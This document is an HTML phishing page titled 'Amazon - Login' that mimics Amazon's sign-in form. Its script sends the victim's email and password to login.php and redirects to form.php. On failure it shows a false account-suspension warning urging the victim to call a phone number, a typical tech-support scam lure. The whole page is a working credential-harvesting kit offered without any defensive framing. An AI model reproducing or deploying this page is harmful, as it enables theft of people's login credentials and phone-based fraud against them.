<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

     <title>Amazon - Login</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<style type="text/css">

h2 {
  margin-top: 2px;
  margin-bottom: 2px;
}

.divider {
  text-align: center;
  margin-top: 20px;
  margin-bottom: 5px;
}

.divider hr {
  margin: 7px 0px;
  width: 35%;
}

.left { float: left; }

.right { float: right; }
#result{
     /*color: red;*/
     display: none;
     position: relative;
     border:1px solid red;
       
}
ul li{
  list-style-type:none;
}
#box .col-md-4{
 border: 1px solid #ccc;
}
</style>
<body>

<div class="container" style="margin-top: 6%;">
     <div class="row">
          <div class="col-md-4"></div>
          <div id="box">
          <div class="col-md-4"> 
          <form method="post">  
            
            <center><img src="download.png" class="img-responsive" style="margin-top: 5%; width: 120px;"></center>
      <div class="form-group">
             <div id="result"><ul><li>A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br>
        Please call on <a href="#">+1-888-318-0759</a> to reactivate your account</li> </ul>
          </div>
        </div>
       <div class="form-group">
             <input type="text" name="email" id="email" maxlength="50" class="form-control input-lg" placeholder="Email">
        </div>
        <div class="form-group">
             <input  type="password" id="password" name="password" maxlength="25" class="form-control input-lg" placeholder="Password">
        </div>
        <div class="form-group">
             <button  type="button" onclick="login();" name="submit" id="submit" class="btn btn-block btn-lg btn-primary" style="  font-size: 15px;"><b>Log in</b></button>
        </div>
     <div class="form-group divider">
            <h6 class="text-center"><a>Having trouble logging in?</a></h6>
             <hr class="left"><small>or</small><hr class="right">
        </div>
<button type="button" class="btn btn-default  btn-block"  style="background-color:lightgray ; color:black; margin-bottom: 10px;"><b>Sign Up</b></button>  
</form>
</div>
</div>
</div>
</div>
</body>
</html>
                    

<script type="text/javascript">
 function login(){
        var email=$('#email').val();
        var password=$('#password').val();
        // alert(email);
          $.ajax({
          type:'post',
          url:'login.php',
          data: {email:email,password:password},
          success:function(data) {
            if(data ==1){
              window.location.href='form.php';
              // alert("success");
            }
            else{
             $('#result').show();
            
            }
          }
        
       }); 
       }  
   

</script>
